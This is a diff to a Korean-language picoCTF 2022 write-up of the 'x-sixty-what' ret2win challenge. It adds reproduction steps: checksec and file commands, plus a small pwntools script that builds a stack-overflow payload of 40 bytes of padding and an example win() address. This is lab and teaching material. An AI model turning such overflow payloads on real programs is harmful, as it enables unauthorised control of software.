@@ -1,7 +1,7 @@
 ---
 title: x-sixty-what — picoCTF 2022 pwn writeup
 created: 2026-06-15
-updated: 2026-06-15
+updated: 2026-06-16
 type: query
 tags: [ctf, pwn, stack-overflow, ret2win, x64, nopie, no-canary, picoctf]
 sources: [https://ctftime.org/writeup/32813, https://cryptocat.me/blog/ctf/2022/pico/pwn/x_sixty_what/, https://github.com/HHousen/PicoCTF-2022/blob/master/Binary%20Exploitation/x-sixty-what/README.md]
@@ -69,6 +69,24 @@ io.sendlineafter(b':', payload)  # 입력을 보냅니다.
 io.interactive()                 # flag 출력 후 상호작용합니다.
 ```
 
+
+## 재현 절차
+
+1. 64-bit 바이너리와 스택 정렬 요구를 확인합니다.
+```bash
+# 아키텍처와 보호기법을 먼저 확인합니다.
+file ./vuln              # 예상: ELF 64-bit LSB executable
+checksec --file=./vuln    # 예상: NX / PIE / Canary 여부가 출력됩니다.
+```
+2. 리턴 주소와 스택 정렬을 맞춘 뒤 win으로 이동합니다.
+```python
+# 64-bit ret2win은 정렬 문제가 자주 있으므로 확인합니다.
+from pwn import *
+payload = b"A" * 40              # 예시 오프셋입니다.
+payload += p64(0x40123a)         # 예시: win() 주소입니다.
+print(payload)
+```
+3. 실행 결과로 flag가 출력되는지 확인합니다.
 ## 6. 방어 관점 메모
 
 - 64-bit라서 자동으로 안전한 것은 아닙니다.
